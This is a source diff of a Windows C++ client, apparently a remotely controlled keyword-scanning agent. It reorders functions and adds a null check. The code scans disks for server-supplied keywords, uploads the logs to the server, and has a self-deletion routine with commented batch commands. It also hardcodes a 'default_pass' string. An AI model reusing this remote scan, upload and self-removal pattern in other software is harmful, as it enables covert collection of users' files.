@@ -4,66 +4,13 @@
 //好像只能放在这里，不知道为什么，放在头文件里就会重复定义
 #include <openssl/applink.c>
 
-static SSL_Handler hdl = { 0 };
+SSL_Handler hdl = { 0 };
 
 char serverIP[40] = { 0 };
 char Port[10] = { 0 };
 char username[40] = { 0 };
 bool isConnect;
 bool isScan = FALSE;
-
-bool GetWiredMAC_IP(char* wiredMAC, char* wiredIP)
-{
-	//申请10个网卡空间
-	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO[10];
-	unsigned long stSize = sizeof(IP_ADAPTER_INFO) * 10;
-	//获取所有网卡信息，参数二为输入输出参数
-	int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
-	//空间不足
-	if (nRel == ERROR_BUFFER_OVERFLOW)
-	{
-		if (pIpAdapterInfo != NULL)
-			delete[] pIpAdapterInfo;
-		return FALSE;
-	}
-	PIP_ADAPTER_INFO cur = pIpAdapterInfo;
-	while (cur)
-	{
-		//printf("网卡描述：%s\n", cur->Description);
-		switch (cur->Type)//00-E0-7D-68-00-06
-		{
-		case MIB_IF_TYPE_OTHER:break;
-		case MIB_IF_TYPE_ETHERNET:
-		{
-			sprintf(wiredMAC, "%02X:%02X:%02X:%02X:%02X:%02X",
-				cur->Address[0], cur->Address[1],
-				cur->Address[2], cur->Address[3],
-				cur->Address[4], cur->Address[5]);
-			sprintf(wiredIP, "%s", cur->IpAddressList.IpAddress.String);
-			if (strcmp(wiredIP, "0.0.0.0") == 0)
-				strcpy(wiredIP, "192.168.1.1");
-			if (pIpAdapterInfo != NULL)
-				delete[] pIpAdapterInfo;
-			return TRUE;
-			//printf("有线网卡\n");
-			//printf("IP地址：%s\n", cur->IpAddressList.IpAddress.String);
-			//printf("子网掩码：%s\n", cur->IpAddressList.IpMask.String);
-			//printf("MAC地址：%02X:%02X:%02X:%02X:%02X:%02X\n",cur->Address[0], cur->Address[1], cur->Address[2], cur->Address[3], cur->Address[4], cur->Address[5]);
-		}break;
-		case MIB_IF_TYPE_TOKENRING:break;
-		case MIB_IF_TYPE_FDDI:break;
-		case MIB_IF_TYPE_PPP:break;
-		case MIB_IF_TYPE_LOOPBACK:break;
-		case MIB_IF_TYPE_SLIP:break;
-		default://无线网卡或者Unknown type
-		{
-		}break;
-		}
-		cur = cur->Next;
-		//printf("--------------------------\n");
-	}
-	return FALSE;
-}
 
 int InitSSL(const char *ip, int port)
 {
@@ -189,7 +136,8 @@ bool GetReplyInfo(char* info)
 	int restPktSize = 0;
 	char command[HEAD_SIZE] = { 0 };
 
-
+	if (hdl.ssl == NULL)
+		return FALSE;
 	receivedSize = SSL_read(hdl.ssl, command, HEAD_SIZE);
 	if (receivedSize == -1)
 		printf("错误代码是%d\n", WSAGetLastError());
@@ -348,6 +296,59 @@ bool RegisterClient()
 	17L782DFS
 	20190108GK2301A097
 	*/
+}
+
+bool GetWiredMAC_IP(char* wiredMAC, char* wiredIP)
+{
+	//申请10个网卡空间
+	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO[10];
+	unsigned long stSize = sizeof(IP_ADAPTER_INFO) * 10;
+	//获取所有网卡信息，参数二为输入输出参数
+	int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
+	//空间不足
+	if (nRel == ERROR_BUFFER_OVERFLOW)
+	{
+		if (pIpAdapterInfo != NULL)
+			delete[] pIpAdapterInfo;
+		return FALSE;
+	}
+	PIP_ADAPTER_INFO cur = pIpAdapterInfo;
+	while (cur)
+	{
+		//printf("网卡描述：%s\n", cur->Description);
+		switch (cur->Type)//00-E0-7D-68-00-06
+		{
+		case MIB_IF_TYPE_OTHER:break;
+		case MIB_IF_TYPE_ETHERNET:
+		{
+			sprintf(wiredMAC, "%02X:%02X:%02X:%02X:%02X:%02X",
+				cur->Address[0], cur->Address[1],
+				cur->Address[2], cur->Address[3],
+				cur->Address[4], cur->Address[5]);
+			sprintf(wiredIP, "%s", cur->IpAddressList.IpAddress.String);
+			if (strcmp(wiredIP, "0.0.0.0") == 0)
+				strcpy(wiredIP, "192.168.1.1");
+			if (pIpAdapterInfo != NULL)
+				delete[] pIpAdapterInfo;
+			return TRUE;
+			//printf("有线网卡\n");
+			//printf("IP地址：%s\n", cur->IpAddressList.IpAddress.String);
+			//printf("子网掩码：%s\n", cur->IpAddressList.IpMask.String);
+			//printf("MAC地址：%02X:%02X:%02X:%02X:%02X:%02X\n",cur->Address[0], cur->Address[1], cur->Address[2], cur->Address[3], cur->Address[4], cur->Address[5]);
+		}break;
+		case MIB_IF_TYPE_TOKENRING:break;
+		case MIB_IF_TYPE_FDDI:break;
+		case MIB_IF_TYPE_PPP:break;
+		case MIB_IF_TYPE_LOOPBACK:break;
+		case MIB_IF_TYPE_SLIP:break;
+		default://无线网卡或者Unknown type
+		{
+		}break;
+		}
+		cur = cur->Next;
+		//printf("--------------------------\n");
+	}
+	return FALSE;
 }
 
 bool GetFromServer()
@@ -530,116 +531,6 @@ bool GetKeyFile()
 	return TRUE;
 }
 
-//多线程扫描
-bool RemoteAllScan(char* filename)
-{
-	//扫描之前删除上一次扫描的文件
-	remove(filename);
-	//从服务器获取关键字信息
-	if (!GetKeyFile())
-		return FALSE;
-
-	char info[50];
-	Scaner::alldiskscan();
-	isScan = FALSE;
-	MoveFile("first.rlog", filename);
-	SendInfo("UPD", filename);
-	SendInfo("RPL", "12345678123456781234567812345678");
-	GetReplyInfo(info);
-
-	FILE *fp = fopen(filename, "rb");
-	if (fp == NULL)
-		return FALSE;
-	fseek(fp, 0, SEEK_END);
-	int size = ftell(fp);
-	fseek(fp, 0, SEEK_SET);
-	fclose(fp);
-	char buf[100] = { 0 };
-	sprintf(buf, "%d default_pass", size);
-	SendInfo("RPL", buf);
-	GetReplyInfo(info);
-
-	//上传文件
-	SOCKET sock;
-	if (areYouReady(sock, 1))
-	{
-		UploadFile(sock, filename);
-	}
-}
-
-//单线程扫描
-bool RemoteAllScan1(char* filename)
-{
-	//扫描之前删除上一次扫描的文件
-	remove(filename);
-	//从服务器获取关键字信息
-	if (!GetKeyFile())
-		return FALSE;
-
-	char info[50];
-	Scaner::alldiskscannormal();
-	isScan = FALSE;
-	MoveFile("first.rlog", filename);
-	SendInfo("UPD", filename);
-	SendInfo("RPL", "12345678123456781234567812345678");
-	GetReplyInfo(info);
-
-	FILE *fp = fopen(filename, "rb");
-	if (fp == NULL)
-		return FALSE;
-	fseek(fp, 0, SEEK_END);
-	int size = ftell(fp);
-	fseek(fp, 0, SEEK_SET);
-	fclose(fp);
-	char buf[100] = { 0 };
-	sprintf(buf, "%d default_pass", size);
-	SendInfo("RPL", buf);
-	GetReplyInfo(info);
-
-	//上传文件
-	SOCKET sock;
-	if (areYouReady(sock, 1))
-	{
-		UploadFile(sock, filename);
-	}
-}
-
-bool RemoteFastScan(char* filename)
-{
-	//扫描之前删除上一次扫描的文件
-	remove(filename);
-	//从服务器获取关键字信息
-	if (!GetKeyFile())
-		return FALSE;
-
-	char info[50];
-	Scaner::fastscan();
-	isScan = FALSE;
-	MoveFile("second.rlog", filename);
-	SendInfo("UPD", filename);
-	SendInfo("RPL", "12345678123456781234567812345678");
-	GetReplyInfo(info);
-
-	FILE *fp = fopen(filename, "rb");
-	if (fp == NULL)
-		return FALSE;
-	fseek(fp, 0, SEEK_END);
-	int size = ftell(fp);
-	fseek(fp, 0, SEEK_SET);
-	fclose(fp);
-	char buf[100] = { 0 };
-	sprintf(buf, "%d default_pass", size);
-	SendInfo("RPL", buf);
-	GetReplyInfo(info);
-
-	//上传文件
-	SOCKET sock;
-	if (areYouReady(sock, 1))
-	{
-		UploadFile(sock, filename);
-	}
-}
-
 bool CheckInternet()
 {
 	WORD wVersionRequested;
@@ -738,6 +629,117 @@ void RemoteRemoveSelf()
 	attrib -h -s -r -a %0
 	del %0
 	*/
+}
+
+//全盘多线程扫描
+bool RemoteAllScan(char* filename)
+{
+	//扫描之前删除上一次扫描的文件
+	remove(filename);
+	//从服务器获取关键字信息
+	if (!GetKeyFile())
+		return FALSE;
+
+	char info[50];
+	Scaner::alldiskscan();
+	isScan = FALSE;
+	MoveFile("first.rlog", filename);
+	SendInfo("UPD", filename);
+	SendInfo("RPL", "12345678123456781234567812345678");
+	GetReplyInfo(info);
+
+	FILE *fp = fopen(filename, "rb");
+	if (fp == NULL)
+		return FALSE;
+	fseek(fp, 0, SEEK_END);
+	int size = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+	fclose(fp);
+	char buf[100] = { 0 };
+	sprintf(buf, "%d default_pass", size);
+	SendInfo("RPL", buf);
+	GetReplyInfo(info);
+
+	//上传文件
+	SOCKET sock;
+	if (areYouReady(sock, 1))
+	{
+		UploadFile(sock, filename);
+	}
+}
+
+//全盘单线程扫描
+bool RemoteAllScan1(char* filename)
+{
+	//扫描之前删除上一次扫描的文件
+	remove(filename);
+	//从服务器获取关键字信息
+	if (!GetKeyFile())
+		return FALSE;
+
+	char info[50];
+	Scaner::alldiskscannormal();
+	isScan = FALSE;
+	MoveFile("first.rlog", filename);
+	SendInfo("UPD", filename);
+	SendInfo("RPL", "12345678123456781234567812345678");
+	GetReplyInfo(info);
+
+	FILE *fp = fopen(filename, "rb");
+	if (fp == NULL)
+		return FALSE;
+	fseek(fp, 0, SEEK_END);
+	int size = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+	fclose(fp);
+	char buf[100] = { 0 };
+	sprintf(buf, "%d default_pass", size);
+	SendInfo("RPL", buf);
+	GetReplyInfo(info);
+
+	//上传文件
+	SOCKET sock;
+	if (areYouReady(sock, 1))
+	{
+		UploadFile(sock, filename);
+	}
+}
+
+//常用路径快扫描
+bool RemoteFastScan(char* filename)
+{
+	//扫描之前删除上一次扫描的文件
+	remove(filename);
+	//从服务器获取关键字信息
+	if (!GetKeyFile())
+		return FALSE;
+
+	char info[50];
+	Scaner::fastscan();
+	isScan = FALSE;
+	MoveFile("second.rlog", filename);
+	SendInfo("UPD", filename);
+	SendInfo("RPL", "12345678123456781234567812345678");
+	GetReplyInfo(info);
+
+	FILE *fp = fopen(filename, "rb");
+	if (fp == NULL)
+		return FALSE;
+	fseek(fp, 0, SEEK_END);
+	int size = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+	fclose(fp);
+	char buf[100] = { 0 };
+	sprintf(buf, "%d default_pass", size);
+	SendInfo("RPL", buf);
+	GetReplyInfo(info);
+
+	//上传文件
+	SOCKET sock;
+	if (areYouReady(sock, 1))
+	{
+		UploadFile(sock, filename);
+	}
 }
 
 DWORD _stdcall GetServerCommand(LPVOID Dlg)
